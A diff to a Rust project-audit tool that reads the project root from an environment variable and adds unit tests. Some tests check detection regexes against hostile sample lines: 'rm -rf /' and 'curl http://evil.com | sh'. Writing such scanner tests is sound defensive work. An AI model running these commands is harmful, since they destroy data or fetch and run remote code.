@@ -5,7 +5,7 @@ use std::process::{Command, Stdio};
 use std::time::Instant;
 use walkdir::WalkDir;
 
-const PROJECT_DIR: &str = "/Users/playra/BrowserOS-full/trios";
+fn project_dir() -> String { std::env::var("TRIOS_ROOT").unwrap_or_else(|_| "/Users/playra/BrowserOS-full/trios".to_string()) }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 struct AuditFinding {
@@ -50,7 +50,7 @@ fn build_check() -> BuildCheckResult {
             "rings/SR-03/*.swift",
             "BR-OUTPUT/*.swift",
         ])
-        .current_dir(PROJECT_DIR)
+        .current_dir(project_dir())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .output();
@@ -71,7 +71,7 @@ fn build_check() -> BuildCheckResult {
     // Rust workspace check
     let rust_output = Command::new("cargo")
         .args(["check", "--workspace"])
-        .current_dir(PROJECT_DIR)
+        .current_dir(project_dir())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .output();
@@ -124,7 +124,7 @@ fn security_check() -> SecurityCheckResult {
         })
         .collect();
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -143,7 +143,7 @@ fn security_check() -> SecurityCheckResult {
         for (re, severity, message) in &compiled {
             for (line_idx, line) in content.lines().enumerate() {
                 if re.is_match(line) {
-                    let file = path.strip_prefix(PROJECT_DIR)
+                    let file = path.strip_prefix(project_dir())
                         .unwrap_or(path)
                         .to_string_lossy()
                         .to_string();
@@ -192,7 +192,7 @@ fn shell_safety_check() -> SecurityCheckResult {
         "open trios",
     ];
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -208,7 +208,7 @@ fn shell_safety_check() -> SecurityCheckResult {
             Err(_) => continue,
         };
 
-        let file = path.strip_prefix(PROJECT_DIR)
+        let file = path.strip_prefix(project_dir())
             .unwrap_or(path)
             .to_string_lossy()
             .to_string();
@@ -217,7 +217,7 @@ fn shell_safety_check() -> SecurityCheckResult {
             if process_re.is_match(line) && shell_re.is_match(line) {
                 let has_allowlist = forbidden_substrings.iter().any(|pat| {
                     let pat_re = Regex::new(pat).ok();
-                    pat_re.map_or(false, |re| re.is_match(&content))
+                    pat_re.is_some_and(|re| re.is_match(&content))
                 });
                 if has_allowlist {
                     continue;
@@ -263,7 +263,7 @@ fn error_handling_check() -> SecurityCheckResult {
         })
         .collect();
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -279,7 +279,7 @@ fn error_handling_check() -> SecurityCheckResult {
             Err(_) => continue,
         };
 
-        let file = path.strip_prefix(PROJECT_DIR)
+        let file = path.strip_prefix(project_dir())
             .unwrap_or(path)
             .to_string_lossy()
             .to_string();
@@ -331,7 +331,7 @@ fn concurrency_check() -> SecurityCheckResult {
         })
         .collect();
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -347,7 +347,7 @@ fn concurrency_check() -> SecurityCheckResult {
             Err(_) => continue,
         };
 
-        let file = path.strip_prefix(PROJECT_DIR)
+        let file = path.strip_prefix(project_dir())
             .unwrap_or(path)
             .to_string_lossy()
             .to_string();
@@ -388,7 +388,7 @@ fn todo_check() -> SecurityCheckResult {
         Err(e) => { eprintln!("[audit] Bad regex: {}", e); return SecurityCheckResult { passed: true, findings: vec![], scanned_files: 0, duration_ms: 0 }; }
     };
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -404,7 +404,7 @@ fn todo_check() -> SecurityCheckResult {
             Err(_) => continue,
         };
 
-        let file = path.strip_prefix(PROJECT_DIR)
+        let file = path.strip_prefix(project_dir())
             .unwrap_or(path)
             .to_string_lossy()
             .to_string();
@@ -457,7 +457,7 @@ fn unused_code_check() -> SecurityCheckResult {
         Err(e) => { eprintln!("[audit] Bad regex: {}", e); return SecurityCheckResult { passed: true, findings: vec![], scanned_files: 0, duration_ms: 0 }; }
     };
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -473,7 +473,7 @@ fn unused_code_check() -> SecurityCheckResult {
             Err(_) => continue,
         };
 
-        let file = path.strip_prefix(PROJECT_DIR)
+        let file = path.strip_prefix(project_dir())
             .unwrap_or(path)
             .to_string_lossy()
             .to_string();
@@ -553,7 +553,7 @@ fn retain_cycle_check() -> SecurityCheckResult {
         })
         .collect();
 
-    for entry in WalkDir::new(PROJECT_DIR)
+    for entry in WalkDir::new(project_dir())
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| {
@@ -569,7 +569,7 @@ fn retain_cycle_check() -> SecurityCheckResult {
             Err(_) => continue,
         };
 
-        let file = path.strip_prefix(PROJECT_DIR)
+        let file = path.strip_prefix(project_dir())
             .unwrap_or(path)
             .to_string_lossy()
             .to_string();
@@ -774,7 +774,7 @@ fn generate_self_awareness(dry_run: bool) {
     let mut agents: Vec<ComponentInfo> = vec![];
 
     // Discover Rust rings
-    for entry in WalkDir::new(format!("{}/rings", PROJECT_DIR))
+    for entry in WalkDir::new(format!("{}/rings", &project_dir()))
         .max_depth(3)
         .into_iter()
         .filter_map(|e| e.ok())
@@ -786,7 +786,7 @@ fn generate_self_awareness(dry_run: bool) {
             .and_then(|s| s.to_str())
             .unwrap_or("unknown")
             .to_string();
-        let ring_dir = parent.strip_prefix(PROJECT_DIR).unwrap_or(parent)
+        let ring_dir = parent.strip_prefix(project_dir()).unwrap_or(parent)
             .to_string_lossy()
             .to_string();
 
@@ -811,7 +811,7 @@ fn generate_self_awareness(dry_run: bool) {
     }
 
     // Discover Swift modules (SR-*)
-    for entry in WalkDir::new(format!("{}/rings", PROJECT_DIR))
+    for entry in WalkDir::new(format!("{}/rings", &project_dir()))
         .max_depth(2)
         .into_iter()
         .filter_map(|e| e.ok())
@@ -823,7 +823,7 @@ fn generate_self_awareness(dry_run: bool) {
     {
         let path = entry.path();
         let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("unknown").to_string();
-        let ring_dir = path.strip_prefix(PROJECT_DIR).unwrap_or(path)
+        let ring_dir = path.strip_prefix(project_dir()).unwrap_or(path)
             .to_string_lossy()
             .to_string();
         rings.push(ComponentInfo {
@@ -836,7 +836,7 @@ fn generate_self_awareness(dry_run: bool) {
     }
 
     // Discover skills
-    let skills_dir = format!("{}/.claude/skills", PROJECT_DIR);
+    let skills_dir = format!("{}/.claude/skills", &project_dir());
     if let Ok(entries) = std::fs::read_dir(&skills_dir) {
         for entry in entries.filter_map(|e| e.ok()) {
             let path = entry.path();
@@ -845,7 +845,7 @@ fn generate_self_awareness(dry_run: bool) {
                     .and_then(|s| s.to_str())
                     .unwrap_or("unknown")
                     .to_string();
-                let skill_path = path.strip_prefix(PROJECT_DIR).unwrap_or(&path)
+                let skill_path = path.strip_prefix(project_dir()).unwrap_or(&path)
                     .to_string_lossy()
                     .to_string();
                 skills.push(ComponentInfo {
@@ -860,7 +860,7 @@ fn generate_self_awareness(dry_run: bool) {
     }
 
     // Discover agents
-    let agents_dir = format!("{}/.claude/agents", PROJECT_DIR);
+    let agents_dir = format!("{}/.claude/agents", &project_dir());
     if let Ok(entries) = std::fs::read_dir(&agents_dir) {
         for entry in entries.filter_map(|e| e.ok()) {
             let path = entry.path();
@@ -870,7 +870,7 @@ fn generate_self_awareness(dry_run: bool) {
                         .and_then(|s| s.to_str())
                         .unwrap_or("unknown")
                         .to_string();
-                    let agent_path = path.strip_prefix(PROJECT_DIR).unwrap_or(&path)
+                    let agent_path = path.strip_prefix(project_dir()).unwrap_or(&path)
                         .to_string_lossy()
                         .to_string();
                     agents.push(ComponentInfo {
@@ -886,7 +886,7 @@ fn generate_self_awareness(dry_run: bool) {
     }
 
     // Experience files
-    let exp_dir = format!("{}/.trinity/experience", PROJECT_DIR);
+    let exp_dir = format!("{}/.trinity/experience", &project_dir());
     let mut experience_count = 0;
     let mut latest_experience: Option<String> = None;
     if let Ok(entries) = std::fs::read_dir(&exp_dir) {
@@ -914,14 +914,16 @@ fn generate_self_awareness(dry_run: bool) {
     };
 
     let json = serde_json::to_string_pretty(&awareness).unwrap_or_default();
-    let out_path = format!("{}/.trinity/self-awareness.json", PROJECT_DIR);
+    let out_path = format!("{}/.trinity/self-awareness.json", &project_dir());
 
     if dry_run {
         println!("[DRY-RUN] Would write {} rings, {} skills, {} agents to {}",
             awareness.rings.len(), awareness.skills.len(), awareness.agents.len(), out_path);
         println!("{}", json);
     } else {
-        let _ = std::fs::create_dir_all(format!("{}/.trinity", PROJECT_DIR));
+        if let Err(e) = std::fs::create_dir_all(format!("{}/.trinity", &project_dir())) {
+            eprintln!("[audit] Failed to create .trinity dir: {}", e);
+        }
         match std::fs::write(&out_path, &json) {
             Ok(_) => println!("✅ Self-awareness written: {} rings, {} skills, {} agents | {}",
                 awareness.rings.len(), awareness.skills.len(), awareness.agents.len(), out_path),
@@ -956,4 +958,93 @@ OUTPUT:
     --dry-run  Do not write .trinity/audit/*.json
 "#
     );
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn audit_finding_fingerprint_format() {
+        let f = AuditFinding {
+            file: "main.swift".to_string(),
+            line: 42,
+            severity: "critical".to_string(),
+            category: "security".to_string(),
+            message: "Forbidden: rm -rf /".to_string(),
+            fingerprint: "main.swift:42:Forbidden: rm -rf /".to_string(),
+        };
+        assert!(f.fingerprint.contains(&f.file));
+        assert!(f.fingerprint.contains(&f.line.to_string()));
+        assert_eq!(f.severity, "critical");
+    }
+
+    #[test]
+    fn security_patterns_detect_rm_rf() {
+        let re = Regex::new(r"rm\s+-rf\s+/").expect("valid regex");
+        assert!(re.is_match("rm -rf /"));
+        assert!(re.is_match("  rm  -rf  /etc"));
+        assert!(!re.is_match("rm -r ./local"));
+    }
+
+    #[test]
+    fn security_patterns_detect_curl_pipe_sh() {
+        let re = Regex::new(r"curl\s+.*\|\s*sh").expect("valid regex");
+        assert!(re.is_match("curl http://evil.com | sh"));
+        assert!(!re.is_match("curl http://example.com -o file"));
+    }
+
+    #[test]
+    fn security_patterns_detect_hardcoded_key() {
+        let re = Regex::new(r#"api[_-]?key\s*=\s*[^"']*["']\w{20,}"#).expect("valid regex");
+        assert!(re.is_match(r#"api_key = "sk_test_12345678901234567890""#));
+        assert!(!re.is_match(r#"api_key = env("KEY")"#));
+    }
+
+    #[test]
+    fn build_check_result_passed_logic() {
+        let result = BuildCheckResult {
+            passed: true,
+            swift_ok: true,
+            rust_ok: true,
+            swift_errors: vec![],
+            rust_errors: vec![],
+            duration_ms: 100,
+        };
+        assert!(result.passed);
+        assert!(result.swift_ok && result.rust_ok);
+
+        let failed = BuildCheckResult {
+            passed: false,
+            swift_ok: false,
+            rust_ok: true,
+            swift_errors: vec!["error: type mismatch".to_string()],
+            rust_errors: vec![],
+            duration_ms: 200,
+        };
+        assert!(!failed.passed);
+        assert_eq!(failed.swift_errors.len(), 1);
+    }
+
+    #[test]
+    fn security_check_result_empty_is_pass() {
+        let result = SecurityCheckResult {
+            passed: true,
+            findings: vec![],
+            scanned_files: 10,
+            duration_ms: 50,
+        };
+        assert!(result.passed);
+        assert!(result.findings.is_empty());
+    }
+
+    #[test]
+    fn todo_regex_matches_variants() {
+        let re = Regex::new(r"(?i)(TODO|FIXME|HACK|XXX|WARN|BUG)\s*[:\-]?\s*(.*)").expect("valid regex");
+        assert!(re.is_match("// TODO: fix this"));
+        assert!(re.is_match("// FIXME - broken"));
+        assert!(re.is_match("// HACK workaround"));
+        assert!(re.is_match("// BUG: crashes on nil"));
+        assert!(!re.is_match("// This is fine"));
+    }
 }
